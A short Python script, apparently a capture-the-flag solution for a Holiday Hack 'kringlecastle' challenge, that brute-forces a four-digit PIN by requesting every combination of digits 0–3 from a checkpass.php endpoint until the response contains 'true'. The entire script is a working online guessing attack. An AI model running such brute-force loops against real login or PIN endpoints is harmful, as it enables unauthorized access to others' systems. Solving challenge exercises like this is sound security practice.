import requests
from itertools import product

a = [0, 1, 2, 3]
possible_pins = list(product(a, repeat=4))

for pin in possible_pins:

	attempt = ''
	for thing in pin:
		attempt = attempt + str(thing)

	url='https://doorpasscoden.kringlecastle.com/checkpass.php?i='+str(attempt)+'&resourceId=undefined'
	resp=requests.get(url)
	print(url)
	print(resp.text)
	if 'true' in resp.text:
		print('Found pin {0}'.format(attempt))
		exit(0)
